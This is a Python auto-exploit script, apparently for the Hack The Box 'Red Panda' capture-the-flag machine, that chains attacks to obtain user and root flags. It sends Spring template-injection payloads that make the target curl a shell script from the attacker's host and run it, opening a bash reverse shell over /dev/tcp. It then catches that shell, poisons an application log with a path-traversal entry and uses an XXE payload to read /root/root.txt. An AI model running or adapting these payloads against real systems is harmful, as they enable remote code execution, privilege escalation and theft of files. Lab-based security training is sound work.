from pwn import *
from requests import post,get
from http.server import HTTPServer, SimpleHTTPRequestHandler
import sys


Panda_IP=sys.argv[1]
Your_IP=sys.argv[2]
with open("gecko_creds.xml",'w') as XML_File:
    XML_File.write("""<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/root/root.txt"> ]>
<data>&example;</data>""")
XML_File.close()
with open('shell.sh','w') as Shell:
    Shell.write(f"sh -i >& /dev/tcp/{Your_IP}/1337 0>&1")
Shell.close()
def countdown(t): 
    while t: 
        mins, secs = divmod(t, 60) 
        timer = '{:02d}:{:02d}'.format(mins, secs) 
        print(f"Waiting for cron: {timer} please wait", end="\r") 
        time.sleep(1) 
        t-=1

def Server():
    httpd = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
    httpd.serve_forever()
def Run_Exploit():
    post(f'http://{Panda_IP}:8080/search',data={"name":"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl http://"+Your_IP+":8080/shell.sh -o /tmp/shell.sh').getInputStream())}"})
    time.sleep(1)
    post(f"http://{Panda_IP}:8080/search",data={"name":"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('bash /tmp/shell.sh').getInputStream())}"})


def Shell_Listener():
    Listener=listen(1337)
    Shell = Listener.wait_for_connection()
    Shell.recvuntil(b"$")
    warn("Getting Username")
    Shell.send(b'whoami\n')
    Username=Shell.recvuntil(b'$').decode('utf-8').replace('$','').strip()
    warn("Getting User Flag")
    Shell.send(bytes(f'cat /home/{Username}/user.txt\n','utf-8'))
    User_Flag=Shell.recvuntil(b'$').decode('utf-8').replace('$','').strip()
    warn("Changing Directories")
    Shell.send(bytes(f'cd /tmp\n','utf-8'))
    warn("Downloading photo")
    with open('smooch.jpg','wb') as Smooch_Photo:
        Smooch_Photo.write(get('https://raw.githubusercontent.com/Dr-Gecko/Red-Panda-Auto-Exploit/main/smooch.jpg',stream=True).content)
    Smooch_Photo.close()
    warn("Downloading photo on red panda")
    Shell.send(bytes(f'wget http://{Your_IP}:8080/smooch.jpg\n','utf-8'))
    Shell.recvuntil(bytes("$",'utf-8'))
    warn("Downloading XML")
    Shell.send(bytes(f'wget http://{Your_IP}:8080/gecko_creds.xml\n','utf-8'))
    Shell.recvuntil(bytes("$",'utf-8'))
    warn("Changing XML Permissions")
    Shell.send(bytes('chmod 777 /tmp/gecko_creds.xml\n','utf-8'))
    Shell.recvuntil(bytes("$",'utf-8'))
    warn("Poisoning Logs")
    Shell.send(bytes("echo '200||10.10.14.126||Mozilla/5.0 (Windows NT 10.0; rv78.0) Gecko/20100101 Firefox/78.0||/../../../../../../../../tmp/smooch.jpg' > /opt/panda_search/redpanda.log\n",'utf-8'))
    Shell.recvuntil(bytes("$",'utf-8'))
    warn("Waiting for log update")
    countdown(120)
    warn("Getting Root Flag")
    Shell.send(bytes('cat /tmp/gecko_creds.xml\n','utf-8'))
    Root_Flag=Shell.recvuntil(b'</data>').replace(b'<?xml version="1.0" encoding="UTF-8"?>\r\n<!--?xml version="1.0" ?-->\r\n<!DOCTYPE foo>\r\n<data>',b'').replace(b'</data>',b'').replace(b'$',b'').decode('utf-8').strip()
    warn(f"User Flag: {User_Flag}")
    warn(f"Root Flag: {Root_Flag}")
    Shell.close()
    warn("DrGecko 2024")
if __name__ =="__main__":
    print('HTB Red Panda Auto PWN')
    print('Just wait until completion and will print out flags')
    Server_Thread=threading.Thread(target=Server)
    Shell_Thread=threading.Thread(target=Shell_Listener)
    Exploit_Thread = threading.Thread(target=Run_Exploit)
    Shell_Thread.start()
    Server_Thread.start()
    Exploit_Thread.start()
    Server_Thread.join()
    Shell_Thread.join()
    Exploit_Thread.join()

# Dr Gecko 2024